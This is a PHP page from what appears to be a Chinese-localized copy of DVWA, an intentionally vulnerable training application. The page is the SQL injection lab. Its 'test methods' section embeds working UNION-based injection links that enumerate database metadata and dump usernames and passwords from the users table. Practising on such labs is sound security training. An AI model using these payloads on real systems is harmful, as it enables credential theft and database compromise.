<?php

define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
require_once DVWA_WEB_PAGE_TO_ROOT.'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated', 'phpids' ) );

$page = dvwaPageNewGrab();
$page[ 'title' ] .= $page[ 'title_separator' ].'漏洞: SQL 注入';
$page[ 'page_id' ] = 'sqli';

dvwaDatabaseConnect();

$vulnerabilityFile = '';
switch( $_COOKIE[ 'security' ] ) {
	case 'low':
		$vulnerabilityFile = 'low.php';
		break;

	case 'medium':
		$vulnerabilityFile = 'medium.php';
		break;

	case 'high':
	default:
		$vulnerabilityFile = 'high.php';
		break;
}

require_once DVWA_WEB_PAGE_TO_ROOT."vulnerabilities/sqli/source/{$vulnerabilityFile}";

$page[ 'help_button' ] = 'sqli';
$page[ 'source_button' ] = 'sqli';

$magicQuotesWarningHtml = '';

// Check if Magic Quotes are on or off
if( ini_get( 'magic_quotes_gpc' ) == true ) {
	$magicQuotesWarningHtml = "	<div class=\"warning\">Magic Quotes 处于开启状态, 您将不能进行SQL注入，请关闭。</div>";
}

$page[ 'body' ] .= "
<div class=\"body_padded\">
	<h1>漏洞: SQL 注入</h1>

	{$magicQuotesWarningHtml}

	<div class=\"vulnerable_code_area\">

		<h3>用户ID:</h3>

		<form action=\"#\" method=\"GET\">
			<input type=\"text\" name=\"id\">
			<input type=\"submit\" name=\"Submit\" value=\"确定\">
		</form>

		{$html}

	</div>
    <h3><font color=\"red\">测试方法：</font></h3>
    <div class=\"vulnerable_code_area\"><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()) %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">点击获取数据库基本信息</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,concat(table_name) from information_schema.tables where table_schema=database() %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">点击获取数据库所有表</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">点击获取users表的字段</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,concat(user,0x3a,password) from users %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">点击获取users表的内容</font></a><br /><br /><br />
    <h3><font color=\"red\">其它测试请看：</font><a href=\"http://www.waitalone.cn/post/Mysql_Injection.html\" target=\"_blank\">mysql注入总结</a></h3>
    </div>
	<h2>更多信息</h2>
	<ul>
		<li>".dvwaExternalLinkUrlGet( 'http://www.securiteam.com/securityreviews/5DP0N1P76E.html')."</li>
		<li>".dvwaExternalLinkUrlGet( 'http://en.wikipedia.org/wiki/SQL_injection')."</li>
		<li>".dvwaExternalLinkUrlGet( 'http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/')."</li>
		<li>".dvwaExternalLinkUrlGet( 'http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet')."</li>
	</ul>
</div>
";

dvwaHtmlEcho( $page );

?>
